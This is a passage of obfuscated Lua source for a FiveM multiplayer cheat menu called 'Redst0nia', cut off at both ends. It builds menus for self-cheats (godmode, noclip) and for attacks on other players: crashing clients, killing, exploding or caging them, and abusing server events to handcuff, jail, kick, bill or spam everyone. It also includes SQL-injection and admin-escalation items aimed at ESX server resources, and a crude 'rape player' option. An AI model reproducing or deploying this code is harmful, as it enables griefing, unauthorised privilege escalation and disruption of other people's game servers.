                        hcmnFj7ddqmbgXI5lN[3],
                        255
                    )
                end
            end
        end
    end
)
local xhKuzj8kT_tjzPBHo3 = {}
local iJ = NativeUI.CreatePool()
local pcwCmJS =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, aBUogggjoyRteh, Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
pcwCmJS:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(pcwCmJS)
local SeBwsA_kyYZc = iJ:AddSubMenu(pcwCmJS, "Self Menu", "", true, true, "~w~Self Menu")
local e3f4lXMgsXqfLm3vthf = NativeUI.CreateItem("Choose Model", "")
SeBwsA_kyYZc.SubMenu:AddItem(e3f4lXMgsXqfLm3vthf)
local mecF4JNtQaOfC = NativeUI.CreateCheckboxItem("Godmode", false, "")
SeBwsA_kyYZc.SubMenu:AddItem(mecF4JNtQaOfC)
local Tp4 = NativeUI.CreateItem("Demi-godmode", "")
SeBwsA_kyYZc.SubMenu:AddItem(Tp4)
local L8 = NativeUI.CreateCheckboxItem("Invisible", false, "")
SeBwsA_kyYZc.SubMenu:AddItem(L8)
local oeAiyKvsdFpf = NativeUI.CreateItem("Revive Player", "")
SeBwsA_kyYZc.SubMenu:AddItem(oeAiyKvsdFpf)
local P0 = NativeUI.CreateItem("Heal", "")
SeBwsA_kyYZc.SubMenu:AddItem(P0)
local Ae = NativeUI.CreateItem("Give Armour", "")
SeBwsA_kyYZc.SubMenu:AddItem(Ae)
local e0kI = NativeUI.CreateItem("Suicide", "")
SeBwsA_kyYZc.SubMenu:AddItem(e0kI)
local oFQ = NativeUI.CreateCheckboxItem("Infinite Stamina", false, "")
SeBwsA_kyYZc.SubMenu:AddItem(oFQ)
local YDZKANele =
    NativeUI.CreateCheckboxItem("Noclip", false, "~w~Controls: ~b~W~s~/~b~A~s~/~b~S~s~/~b~D~s~ and ~b~Q~s~/~b~Z~s~.")
SeBwsA_kyYZc.SubMenu:AddItem(YDZKANele)
local dSAnaIwl9t3Zfm_ps_1T = NativeUI.CreateCheckboxItem("Become small", false, "Make yourself tiny!")
SeBwsA_kyYZc.SubMenu:AddItem(dSAnaIwl9t3Zfm_ps_1T)
SeBwsA_kyYZc.SubMenu.OnCheckboxChange = function(YLcGzXPscslH, tGqhRPuH3NjIYLKU6, RF7PxZSgOXpN1)
    if tGqhRPuH3NjIYLKU6 == mecF4JNtQaOfC then
        LVlTHmG = RF7PxZSgOXpN1
        local NQVAAZgiUqlg
        if LVlTHmG == true then
            NQVAAZgiUqlg = "~g~enabled"
        else
            NQVAAZgiUqlg = "~r~disabled"
        end
        CahvwB3vGb("Godmode is now " .. NQVAAZgiUqlg .. "~s~.")
    elseif tGqhRPuH3NjIYLKU6 == L8 then
        vLI8tCR2dlNoyQd5 = RF7PxZSgOXpN1
        local qFb6Ck
        if vLI8tCR2dlNoyQd5 == true then
            qFb6Ck = "~g~enabled"
        else
            qFb6Ck = "~r~disabled"
        end
        CahvwB3vGb("Invisible is now " .. qFb6Ck .. "~s~.")
    elseif tGqhRPuH3NjIYLKU6 == YDZKANele then
        p3mYqN1TcwLVndk9iWn = RF7PxZSgOXpN1
        local x0q9Wyke4MIuq8sg
        if p3mYqN1TcwLVndk9iWn == true then
            x0q9Wyke4MIuq8sg = "~g~enabled"
        else
            x0q9Wyke4MIuq8sg = "~r~disabled"
        end
        CahvwB3vGb("Noclip is now " .. x0q9Wyke4MIuq8sg .. "~s~.")
    elseif tGqhRPuH3NjIYLKU6 == oFQ then
        staminaStatus = RF7PxZSgOXpN1
        local b0
        if staminaStatus == true then
            b0 = "~g~enabled"
        else
            b0 = "~r~disabled"
        end
        CahvwB3vGb("Infinite Stamina is now " .. b0 .. "~s~.")
    elseif tGqhRPuH3NjIYLKU6 == dSAnaIwl9t3Zfm_ps_1T then
        tinyStatus = RF7PxZSgOXpN1
        local arF
        if tinyStatus == true then
            arF = "~g~enabled"
        else
            arF = "~r~disabled"
        end
        CahvwB3vGb("Tiny superpower is now " .. arF .. "~s~.")
    end
end
SeBwsA_kyYZc.SubMenu.OnItemSelect = function(cST8d2wCHr7, _tEy3KB9, fFEdnnshaZcaMKjCCSk)
    if _tEy3KB9 == e3f4lXMgsXqfLm3vthf then
        local j = kR3tkcBRzWGoBkSE("Enter Model Name", "", 100)
        RequestModel(GetHashKey(j))
        Wait(500)
        if HasModelLoaded(GetHashKey(j)) then
            SetPlayerModel(PlayerId(), GetHashKey(j))
        else
            CahvwB3vGb("Invalid Model~s~.")
        end
    elseif _tEy3KB9 == Tp4 then
        local YWO = "stt_prop_stunt_soccer_ball"
        while not HasModelLoaded(GetHashKey(YWO)) do
            Citizen.Wait(0)
            RequestModel(GetHashKey(YWO))
        end
        local Yg5IflrXVjUyIxRCIa = CreateObject(GetHashKey(YWO), 0, 0, 0, true, true, false)
        SetEntityVisible(Yg5IflrXVjUyIxRCIa, 0, 0)
        AttachEntityToEntity(
            Yg5IflrXVjUyIxRCIa,
            GetPlayerPed(-1),
            GetPedBoneIndex(GetPlayerPed(-1), 57005),
            0,
            0,
            -1.0,
            0,
            0,
            0,
            false,
            true,
            true,
            true,
            1,
            true
        )
        CahvwB3vGb("You are now demi-godmode~s~.")
    elseif _tEy3KB9 == oeAiyKvsdFpf then
        local BCuLkdXt5 = GetEntityCoords(PlayerPedId())
        local lbE2Du93T = {
            x = Math.Round(BCuLkdXt5.x, 1),
            y = Math.Round(BCuLkdXt5.y, 1),
            z = Math.Round(BCuLkdXt5.z, 1)
        }
        SetEntityCoordsNoOffset(PlayerPedId(), lbE2Du93T.x, lbE2Du93T.y, lbE2Du93T.z, false, false, false, true)
        NetworkResurrectLocalPlayer(lbE2Du93T.x, lbE2Du93T.y, lbE2Du93T.z, 0, true, false)
        SetPlayerInvincible(PlayerPedId(), false)
        ClearPedBloodDamage(PlayerPedId())
        StopScreenEffect("DeathFailOut")
        CahvwB3vGb("You mad, I'm back")
    elseif _tEy3KB9 == P0 then
        SetEntityHealth(PlayerPedId(), 200)
        CahvwB3vGb("You healed yourself~s~.")
    elseif _tEy3KB9 == Ae then
        SetPedArmour(PlayerPedId(), 200)
        CahvwB3vGb("You gave yourself armour~s~.")
    elseif _tEy3KB9 == e0kI then
        SetEntityHealth(PlayerPedId(-1), 0)
        CahvwB3vGb("Pepe Rip :C~s~")
    end
end
local LTlLv682Q4I0NeRzXC = NativeUI.CreateItem("Online Players", "")
pcwCmJS:AddItem(LTlLv682Q4I0NeRzXC)
local MIQV58X66tnwaT2RhS =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Online Players", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
MIQV58X66tnwaT2RhS:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(MIQV58X66tnwaT2RhS)
pcwCmJS:BindMenuToItem(MIQV58X66tnwaT2RhS, LTlLv682Q4I0NeRzXC)
local f114JRSHYi = nil
if GetResourceState("esx_policejob") ~= "missing" and GetResourceState("esx_policejob") == "started" then
    f114JRSHYi = true
else
    f114JRSHYi = false
end
local jJX6OcEau2oa4b_aPv = nil
if GetResourceState("esx_ambulancejob") ~= "missing" and GetResourceState("esx_ambulancejob") == "started" then
    jJX6OcEau2oa4b_aPv = true
else
    jJX6OcEau2oa4b_aPv = false
end
local function SP6M()
    MIQV58X66tnwaT2RhS:Clear()
    local Eh = GetActivePlayers()
    for io = 1, #Eh do
        local agz9GB38AODS9TjOmto = Eh[io]
        local InRwlct7mG7M =
            "~b~" ..
            GetPlayerName(agz9GB38AODS9TjOmto) ..
                " ~s~[~w~" ..
                    GetPlayerServerId(agz9GB38AODS9TjOmto) ..
                        "~s~] " ..
                            (IsPedDeadOrDying(GetPlayerPed(agz9GB38AODS9TjOmto), 1) and "[~r~DEAD~s~]" or
                                "[~g~ALIVE~s~]")
        local HkGzFE1sN_xyfiOBIRqK = NativeUI.CreateItem(InRwlct7mG7M, "")
        MIQV58X66tnwaT2RhS:AddItem(HkGzFE1sN_xyfiOBIRqK)
        local _G2M2ZxOqGmFN1mHog =
            NativeUI.CreateMenu(
            "Redst0nia " .. HrVTH5ewMKL1Pj,
            "~w~Player: ~s~" .. InRwlct7mG7M,
            Ylr442mzV7_qo7glKLZr,
            dL3gLfg8OIwljjM_9
        )
        _G2M2ZxOqGmFN1mHog:SetBannerRectangle(aW60GlTo7turR, true)
        iJ:Add(_G2M2ZxOqGmFN1mHog)
        MIQV58X66tnwaT2RhS:BindMenuToItem(_G2M2ZxOqGmFN1mHog, HkGzFE1sN_xyfiOBIRqK)
        local VV9d =
            iJ:AddSubMenu(_G2M2ZxOqGmFN1mHog, "Troll options on player", "", true, true, "~w~Troll options on player")
        local TScJIcd1bKMR = NativeUI.CreateItem("Cage Player", "~w~Note: ~s~Spawns a cage around the player")
        local vu_SPFoKppleoRd = NativeUI.CreateItem("Explode", "~w~Note: ~s~Simple explosion")
        local qPd = NativeUI.CreateItem("Explode with a car", "~w~Note: ~s~Simple explosion but with a car")
        local g_ = NativeUI.CreateItem("Crash player", "~w~Note: ~s~Click this few times")
        local wRAJ = NativeUI.CreateItem("Rape player", "~s~Rape the player")
        local Zi8U6a = NativeUI.CreateItem("Open player inventory", "~s~Opens player inventory with esx_inventoryhud")
        local W4rY8tn5n = NativeUI.CreateItem("Spawn custom object on player", "~s~Custom object spawning on player")
        local oJwcXtwobgGd =
            NativeUI.CreateCheckboxItem("Stick custom object", false, "~s~Custom object spawning on player, will stick")
        local QSf3iMMkRJP4FdSAfd = NativeUI.CreateItem("Attach UFO to player", "~s~Attaches UFO to player")
        local bq5 = NativeUI.CreateItem("Attach UFO to player V2", "~s~Attaches a little different UFO to player")
        local bScPEpxBA = NativeUI.CreateItem("Attach destroyed UFO to player", "~s~Attaches destroyed UFO to player")
        local k0ZBXmK7WqUBDkE2SC = NativeUI.CreateItem("Attach Yacht to player", "~s~Attaches yacht to player")
        local ZFRZU8MXCvKt_6k0F5 =
            NativeUI.CreateItem("Attach Tower to player", "~s~Attaches maze bank building to player")
        local HX6F6JnTjFtgT =
            NativeUI.CreateItem("Spawn car and smash player above", "~s~Spawns car and smash player from above")
        local F91G =
            NativeUI.CreateItem(
            "Spawn car and smash player above but harder",
            "~s~Spawns car and smash player from above but harder"
        )
        local KdD28ysPxM7zNSoK =
            NativeUI.CreateItem(
            "Spawn a tank with NPC in it to chase the player",
            "~s~Spawns a rhino tank with NPC in it to kill him"
        )
        local zgCN1YxkZzR5 =
            NativeUI.CreateItem(
            "Spawn a heli with NPC in it to chase the player",
            "~s~Spawns a heli with NPC in it to kill him"
        )
        local rSrCo = NativeUI.CreateItem("Spawn a lazer to smash the player", "~s~Spawns a lazer to smash him")
        local UlySlJj2W =
            NativeUI.CreateItem(
            "Spawn animals around the player to kill him",
            "~s~Spawns few animals to kill the player, they're invicible so you'll not be sad. Check the list below !"
        )
        local qMfVyPatrAbrC =
            NativeUI.CreateListItem(
            "Animal",
            {"a_c_rottweiler", "a_c_pug", "a_c_mtlion", "a_c_husky", "a_c_chop"},
            1,
            "Note : Choose any animal you want to kill the player"
        )
        local fzN2m54A62Y =
            NativeUI.CreateItem(
            "Teleport the player to coords",
            "~s~Should teleport the player to designated coords, idk if it works thought"
        )
        local hpq9p =
            NativeUI.CreateItem("Silent kill the player", "~s~Should kill the player without any noise, visuals")
        VV9d.SubMenu:AddItem(vu_SPFoKppleoRd)
        VV9d.SubMenu:AddItem(qPd)
        VV9d.SubMenu:AddItem(TScJIcd1bKMR)
        VV9d.SubMenu:AddItem(g_)
        VV9d.SubMenu:AddItem(wRAJ)
        if not gzhXdn5rXT132aD["es_extended"] then
            Zi8U6a:RightLabel("~r~es_extended")
            Zi8U6a:SetRightBadge(BadgeStyle.Lock)
        end
        VV9d.SubMenu:AddItem(Zi8U6a)
        VV9d.SubMenu:AddItem(W4rY8tn5n)
        VV9d.SubMenu:AddItem(oJwcXtwobgGd)
        VV9d.SubMenu:AddItem(QSf3iMMkRJP4FdSAfd)
        VV9d.SubMenu:AddItem(bq5)
        VV9d.SubMenu:AddItem(bScPEpxBA)
        VV9d.SubMenu:AddItem(k0ZBXmK7WqUBDkE2SC)
        VV9d.SubMenu:AddItem(ZFRZU8MXCvKt_6k0F5)
        VV9d.SubMenu:AddItem(HX6F6JnTjFtgT)
        VV9d.SubMenu:AddItem(F91G)
        VV9d.SubMenu:AddItem(rSrCo)
        VV9d.SubMenu:AddItem(KdD28ysPxM7zNSoK)
        VV9d.SubMenu:AddItem(zgCN1YxkZzR5)
        VV9d.SubMenu:AddItem(UlySlJj2W)
        VV9d.SubMenu:AddItem(qMfVyPatrAbrC)
        VV9d.SubMenu:AddItem(fzN2m54A62Y)
        VV9d.SubMenu:AddItem(hpq9p)
        VV9d.SubMenu.OnItemSelect = function(iAvhVRob, hYrywGB7vy6lveO37L1, SEoJc6TUnq4tToRDa4)
            if hYrywGB7vy6lveO37L1 == TScJIcd1bKMR then
                hco56bFoyhII8nQJJLv5(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Caged player.")
            elseif hYrywGB7vy6lveO37L1 == vu_SPFoKppleoRd then
                O8b(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Exploded player.")
            elseif hYrywGB7vy6lveO37L1 == qPd then
                Nc6XH8N5hbtH9ijtm(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Exploded player with a car.")
            elseif hYrywGB7vy6lveO37L1 == g_ then
                vQg(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Crashing player...")
            elseif hYrywGB7vy6lveO37L1 == wRAJ then
                _FL19AX4sqtr5Q06f6G(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Raped player.")
            elseif hYrywGB7vy6lveO37L1 == Zi8U6a then
                RQSl_fZbUVBS(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Hey, what do you hide " .. GetPlayerName(agz9GB38AODS9TjOmto) .. "?")
            elseif hYrywGB7vy6lveO37L1 == W4rY8tn5n then
                nlI6d(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == QSf3iMMkRJP4FdSAfd then
                vPkvoubzBCI4XOjNUGZZB(agz9GB38AODS9TjOmto, "p_spinning_anus_s")
            elseif hYrywGB7vy6lveO37L1 == bq5 then
                vPkvoubzBCI4XOjNUGZZB(agz9GB38AODS9TjOmto, "imp_prop_ship_01a")
            elseif hYrywGB7vy6lveO37L1 == bScPEpxBA then
                vPkvoubzBCI4XOjNUGZZB(agz9GB38AODS9TjOmto, "gr_prop_damship_01a")
            elseif hYrywGB7vy6lveO37L1 == k0ZBXmK7WqUBDkE2SC then
                vPkvoubzBCI4XOjNUGZZB(agz9GB38AODS9TjOmto, "sm_boat_lod")
            elseif hYrywGB7vy6lveO37L1 == ZFRZU8MXCvKt_6k0F5 then
                vPkvoubzBCI4XOjNUGZZB(agz9GB38AODS9TjOmto, "db_apart_02_")
            elseif hYrywGB7vy6lveO37L1 == HX6F6JnTjFtgT then
                DY56ICJ(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == F91G then
                ZT0FIlMa(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == KdD28ysPxM7zNSoK then
                SpawnRhinoP(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == zgCN1YxkZzR5 then
                SpawnHeliP(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == rSrCo then
                SpawnLazerP(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == UlySlJj2W then
                SpawnDogsP(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == fzN2m54A62Y then
                TPPlayer(agz9GB38AODS9TjOmto)
            elseif hYrywGB7vy6lveO37L1 == hpq9p then
                SilentKillP(agz9GB38AODS9TjOmto)
            end
        end
        VV9d.SubMenu.OnListChange = function(BiEkdh, yz9_kXH9pVWOIm, NqCxEBZO2DfN8964iMxeW)
            if yz9_kXH9pVWOIm == qMfVyPatrAbrC then
                animal = yz9_kXH9pVWOIm:IndexToItem(NqCxEBZO2DfN8964iMxeW)
                CahvwB3vGb("You choosed ~b~" .. animal .. " ~w~as the animal to kill the player")
            end
        end
        VV9d.SubMenu.OnCheckboxChange = function(HGfE4ln1erLuU1n6w, I3a, _X4LyWi4lIF7m)
            if I3a == oJwcXtwobgGd then
                sticked = _X4LyWi4lIF7m
                local UYShUxvPPe9pVsO
                if sticked == true then
                    UYShUxvPPe9pVsO = "~g~enabled"
                else
                    UYShUxvPPe9pVsO = "~r~disabled"
                end
                CahvwB3vGb("Object sticking is now " .. UYShUxvPPe9pVsO .. "~s~.")
            end
        end
        local j = NativeUI.CreateItem("Spectate", "")
        _G2M2ZxOqGmFN1mHog:AddItem(j)
        local pY8PjTR0bDBc1efz5 = NativeUI.CreateItem("Demi-Godmode Player", "")
        _G2M2ZxOqGmFN1mHog:AddItem(pY8PjTR0bDBc1efz5)
        local DPVJ7jjgxGx2FwLzLcR4A = NativeUI.CreateItem("Teleport To Player", "")
        _G2M2ZxOqGmFN1mHog:AddItem(DPVJ7jjgxGx2FwLzLcR4A)
        local w = NativeUI.CreateItem("Give All Weapons", "")
        _G2M2ZxOqGmFN1mHog:AddItem(w)
        local B4VhdD = NativeUI.CreateItem("Give A Single Weapon", "")
        _G2M2ZxOqGmFN1mHog:AddItem(B4VhdD)
        local dkb3rGidRY = NativeUI.CreateItem("Remove All Weapons", "")
        _G2M2ZxOqGmFN1mHog:AddItem(dkb3rGidRY)
        local JdROFo65eRvQnwff = NativeUI.CreateItem("Spawn Vehicle", "")
        _G2M2ZxOqGmFN1mHog:AddItem(JdROFo65eRvQnwff)
        local vssq8mKE9cBDfIwUaSF =
            NativeUI.CreateItem("Handcuff Player", "~w~Note: ~s~Most servers have this patched.")
        if not gzhXdn5rXT132aD["esx_policejob"] then
            vssq8mKE9cBDfIwUaSF:RightLabel("~r~esx_policejob")
            vssq8mKE9cBDfIwUaSF:SetRightBadge(BadgeStyle.Lock)
        end
        _G2M2ZxOqGmFN1mHog:AddItem(vssq8mKE9cBDfIwUaSF)
        local BeI = NativeUI.CreateItem("Kick From Vehicle", "")
        _G2M2ZxOqGmFN1mHog:AddItem(BeI)
        local yimqgJEba = NativeUI.CreateItem("Kick From Vehicle & Take His Car", "")
        _G2M2ZxOqGmFN1mHog:AddItem(yimqgJEba)
        local ogevB3E073jsNmL = NativeUI.CreateItem("Kick From Vehicle & Let AI drive His Car", "")
        _G2M2ZxOqGmFN1mHog:AddItem(ogevB3E073jsNmL)
        local dvGk = NativeUI.CreateItem("Revive Player", "~w~Note: ~s~This may not work on all servers.")
        local ZhzZQ19pgLIfD6 =
            NativeUI.CreateItem("Give Armor To Player", "~w~Note: ~s~Spawns a armor pickup for the player.")
        local fbaTOCZv = NativeUI.CreateItem("Copy Player Outfit", "")
        local Bp3u6E = NativeUI.CreateItem("Copy Player Vehicle", "")
        _G2M2ZxOqGmFN1mHog:AddItem(fbaTOCZv)
        _G2M2ZxOqGmFN1mHog:AddItem(Bp3u6E)
        if not gzhXdn5rXT132aD["esx_ambulancejob"] then
            dvGk:RightLabel("~r~esx_ambulancejob")
            dvGk:SetRightBadge(BadgeStyle.Lock)
        end
        _G2M2ZxOqGmFN1mHog:AddItem(dvGk)
        _G2M2ZxOqGmFN1mHog:AddItem(ZhzZQ19pgLIfD6)
        local HKOZ3 =
            NativeUI.CreateListItem(
            "Armor Pick Count",
            {5, 10, 25, 50, 100},
            1,
            "Note : Choose the amount of armor pickup to spawn"
        )
        _G2M2ZxOqGmFN1mHog:AddItem(HKOZ3)
        local o4Lp = NativeUI.CreateItem("Track player", "~s~Will draw a waypoint to the player")
        _G2M2ZxOqGmFN1mHog:AddItem(o4Lp)
        _G2M2ZxOqGmFN1mHog.OnListChange = function(wWGAHQOnL2Yii, YaXGyPEcJEoh, i0Gf4SP8L)
            if YaXGyPEcJEoh == HKOZ3 then
                armourc = YaXGyPEcJEoh:IndexToItem(i0Gf4SP8L)
                CahvwB3vGb("You choosed ~b~" .. armourc .. " ~w~armor pickup for the player.")
            end
        end
        _G2M2ZxOqGmFN1mHog.OnItemSelect = function(st277EZs9Br6z1Vd, qk, Nmqb7j8O1nk_0IW)
            if qk == j then
                VZ(agz9GB38AODS9TjOmto)
            elseif qk == pY8PjTR0bDBc1efz5 then
                hXijPW(agz9GB38AODS9TjOmto)
            elseif qk == DPVJ7jjgxGx2FwLzLcR4A then
                cwlHj9lWLRyOZ(agz9GB38AODS9TjOmto)
            elseif qk == w then
                D(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Gave all weapons to ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~.")
            elseif qk == B4VhdD then
                FO3YdQ(agz9GB38AODS9TjOmto)
            elseif qk == dkb3rGidRY then
                hk7qI02(agz9GB38AODS9TjOmto)
                CahvwB3vGb("Removed all weapons from ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~.")
            elseif qk == JdROFo65eRvQnwff then
                TVGqnWOVT94yFPrBDln(agz9GB38AODS9TjOmto)
            elseif qk == vssq8mKE9cBDfIwUaSF then
                if gzhXdn5rXT132aD["esx_policejob"] then
                    local hr3LF5VXGwlofq7TQr
                    if xhKuzj8kT_tjzPBHo3[tostring(GetPlayerServerId(agz9GB38AODS9TjOmto))] == true then
                        xhKuzj8kT_tjzPBHo3[tostring(GetPlayerServerId(agz9GB38AODS9TjOmto))] = false
                        hr3LF5VXGwlofq7TQr = "Uncuffed"
                    else
                        xhKuzj8kT_tjzPBHo3[tostring(GetPlayerServerId(agz9GB38AODS9TjOmto))] = true
                        hr3LF5VXGwlofq7TQr = "Cuffed"
                    end
                    TriggerServerEvent(
                        "esx_policejob:handcuff",
                        GetPlayerServerId(agz9GB38AODS9TjOmto),
                        xhKuzj8kT_tjzPBHo3[tostring(GetPlayerServerId(agz9GB38AODS9TjOmto))]
                    )
                    CahvwB3vGb(hr3LF5VXGwlofq7TQr .. " ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~.")
                else
                    CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_policejob~s~!")
                end
            elseif qk == BeI then
                ClearPedTasksImmediately(GetPlayerPed(agz9GB38AODS9TjOmto))
                CahvwB3vGb("Kicked ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~ from their vehicle.")
            elseif qk == yimqgJEba then
                local xhWYz3EcWyJz5_ZMMMJ = GetVehiclePedIsIn(GetPlayerPed(agz9GB38AODS9TjOmto), false)
                if xhWYz3EcWyJz5_ZMMMJ then
                    ClearPedTasksImmediately(GetPlayerPed(agz9GB38AODS9TjOmto))
                    CahvwB3vGb("Kicked ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~ from their vehicle.")
                    SetPedIntoVehicle(GetPlayerPed(-1), xhWYz3EcWyJz5_ZMMMJ, -1)
                    CahvwB3vGb("You just got into his ~b~vehicle~s~.")
                else
                    CahvwB3vGb("Player must ~b~drive~s~ to get his vehicle.")
                end
            elseif qk == ogevB3E073jsNmL then
                local To7t5LKXgBXvgzJMa = GetHashKey("mp_m_waremech_01")
                RequestModel(To7t5LKXgBXvgzJMa)
                while not HasModelLoaded(To7t5LKXgBXvgzJMa) do
                    Citizen.Wait(0)
                end
                local clfLx4IDwxIapK7 = GetVehiclePedIsUsing(GetPlayerPed(agz9GB38AODS9TjOmto))
                if clfLx4IDwxIapK7 then
                    ClearPedTasksImmediately(GetPlayerPed(agz9GB38AODS9TjOmto))
                    local oKFVI2VrhgjdKV =
                        CreatePedInsideVehicle(clfLx4IDwxIapK7, 4, To7t5LKXgBXvgzJMa, -1, true, false)
                    RequestControlOnce(oKFVI2VrhgjdKV)
                    SetDriverAbility(oKFVI2VrhgjdKV, 100)
                    TaskVehicleDriveWander(oKFVI2VrhgjdKV, GetVehiclePedIsIn(oKFVI2VrhgjdKV, false), 50.0, 786948)
                    CahvwB3vGb("AI Driving car ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~.")
                else
                    CahvwB3vGb("Player must ~b~drive~s~ to get his vehicle.")
                end
            elseif qk == fbaTOCZv then
                SetPlayerModel(GetPlayerPed(agz9GB38AODS9TjOmto), GetPlayerPed(-1))
            elseif qk == Bp3u6E then
                CopyPVeh(agz9GB38AODS9TjOmto)
            elseif qk == dvGk then
                if gzhXdn5rXT132aD["esx_ambulancejob"] then
                    TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(agz9GB38AODS9TjOmto))
                    CahvwB3vGb("Revived ~b~" .. S2J(agz9GB38AODS9TjOmto) .. "~s~.")
                else
                    CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_ambulancejob~s~!")
                end
            elseif qk == ZhzZQ19pgLIfD6 then
                ArmorPlayer(agz9GB38AODS9TjOmto)
            elseif qk == o4Lp then
                Track(agz9GB38AODS9TjOmto)
            end
        end
    end
    iJ:TotalItemsPerPage(10)
    iJ:RefreshIndex()
end
SP6M()
local AiN7dvcndd = NativeUI.CreateItem("All Players Menu", "")
pcwCmJS:AddItem(AiN7dvcndd)
local BVrqOXm =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~All Players Menu", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
BVrqOXm:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(BVrqOXm)
pcwCmJS:BindMenuToItem(BVrqOXm, AiN7dvcndd)
local VrMP = NativeUI.CreateCheckboxItem("Exclude Self", false, "")
BVrqOXm:AddItem(VrMP)
local gUT2n = NativeUI.CreateCheckboxItem("Name ESP", false, "~w~Note: ~s~Exclude self does ~r~not ~s~affect ESP.")
BVrqOXm:AddItem(gUT2n)
local DSMpto = NativeUI.CreateCheckboxItem("Box ESP", false, "~w~Note: ~s~Exclude self does ~r~not ~s~affect ESP.")
BVrqOXm:AddItem(DSMpto)
local FhEdbKAAGTMlpp9GV =
    NativeUI.CreateCheckboxItem("Line ESP", false, "~w~Note: ~s~Exclude self does ~r~not ~s~affect ESP.")
BVrqOXm:AddItem(FhEdbKAAGTMlpp9GV)
local hGcN78 = nil
local W8lF5e5lR9q4U8ypad = nil
local WA = iJ:AddSubMenu(BVrqOXm, "ESX/vRP Specific Options", "", true, true, "~w~ESX/vRP Specific Options")
if gzhXdn5rXT132aD["es_extended"] then
    local bgijWbYYTzynGgx = NativeUI.CreateItem("Jail Everyone #1", "~w~Note: ~s~This may not work on all servers.")
    if not gzhXdn5rXT132aD["esx_jail"] then
        bgijWbYYTzynGgx:RightLabel("~r~esx_jail")
        bgijWbYYTzynGgx:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(bgijWbYYTzynGgx)
    local ij0lal = NativeUI.CreateItem("Jail Everyone #2", "~w~Note: ~s~This may not work on all servers.")
    if not gzhXdn5rXT132aD["esx-qalle-jail"] then
        ij0lal:RightLabel("~r~esx-qalle-jail")
        ij0lal:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(ij0lal)
    local v_3S6CcUG7 = NativeUI.CreateItem("Send Invoice To Everyone", "~w~Note: ~s~This may not work on all servers.")
    if not gzhXdn5rXT132aD["esx_billing"] then
        v_3S6CcUG7:RightLabel("~r~esx_billing")
        v_3S6CcUG7:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(v_3S6CcUG7)
    local IHvrqi = NativeUI.CreateItem("Blindfold Everyone", "~w~Note: ~s~This may not work on all servers.")
    if not gzhXdn5rXT132aD["jsfour-blindfold"] then
        IHvrqi:RightLabel("~r~jsfour-blindfold")
        IHvrqi:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(IHvrqi)
    local qrBiY5a =
        NativeUI.CreateItem("Kick Everyone", "~w~Note: ~r~~h~This may result in being kicked / banned on some servers.")
    if not gzhXdn5rXT132aD["esx_spectate"] then
        qrBiY5a:RightLabel("~r~esx_spectate")
        qrBiY5a:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(qrBiY5a)
    local __df =
        NativeUI.CreateItem(
        "Community Service Everyone",
        "~w~Note: ~r~~h~This may result in being kicked / banned on some servers."
    )
    if not gzhXdn5rXT132aD["esx_communityservice"] then
        __df:RightLabel("~r~esx_communityservice")
        __df:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(__df)
    local YO93JL9Sqy = NativeUI.CreateItem("GCPhone Twitter Fucker", "~w~Note: ~s~RIP GCPhone")
    if not gzhXdn5rXT132aD["gcphone"] then
        YO93JL9Sqy:RightLabel("~r~gcphone")
        YO93JL9Sqy:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(YO93JL9Sqy)
    local DtuWovHMdjHkK5 = NativeUI.CreateItem("SQL Fucker", "~w~Note: ~s~Using esx_license")
    if not gzhXdn5rXT132aD["esx_license"] then
        DtuWovHMdjHkK5:RightLabel("~r~esx_license")
        DtuWovHMdjHkK5:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(DtuWovHMdjHkK5)
    local YQPf31PcL =
        NativeUI.CreateItem("SQL Admin Exploit", "~w~Note: ~s~Using esx_kashacter, should make yourself admin")
    if not gzhXdn5rXT132aD["esx_kashacters"] then
        YQPf31PcL:RightLabel("~r~esx_kashacters")
        YQPf31PcL:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(YQPf31PcL)
    local k2H1cdR8D1fgkWgt0Mv = NativeUI.CreateItem("Police Spam Alert", "~w~Note: ~s~Using esx_outlawalert")
    if not gzhXdn5rXT132aD["esx_outlawalert"] then
